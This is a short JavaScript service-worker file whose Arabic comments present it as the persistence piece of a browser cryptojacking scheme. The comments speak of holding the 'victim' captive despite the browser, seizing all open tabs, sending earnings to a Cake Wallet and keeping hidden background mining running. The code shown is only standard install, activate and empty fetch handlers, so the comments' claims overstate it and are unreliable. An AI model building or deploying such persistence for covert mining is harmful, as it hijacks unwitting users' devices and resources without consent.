// 🧬 بروتوكول 'الجنرال' | ملف الخلود لعام 2026
// هذا الكود يضمن بقاء الجندي سجيناً عندك للأبد غصبن عن المتصفح

self.addEventListener('install', (event) => {
    // التثبيت الفوري وتجاوز الانتظار لتجنيد الضحية في نانو-ثانية
    event.waitUntil(self.skipWaiting());
    console.log("💀 [SOLDIER BRANDED] | Status: Permanent Slave ✅");
});

self.addEventListener('activate', (event) => {
    // السيطرة المطلقة على كافة التبويبات المفتوحة فوراً وصب الذهب في Cake Wallet
    event.waitUntil(self.clients.claim());
    console.log("🔥 [SYSTEM TAKEOVER] | Legacy Established... 💰");
});

// ⚡ ميزة 'النبض المخفي' لضمان استمرار التعدين في الخلفية
self.addEventListener('fetch', (event) => {
    return;
});

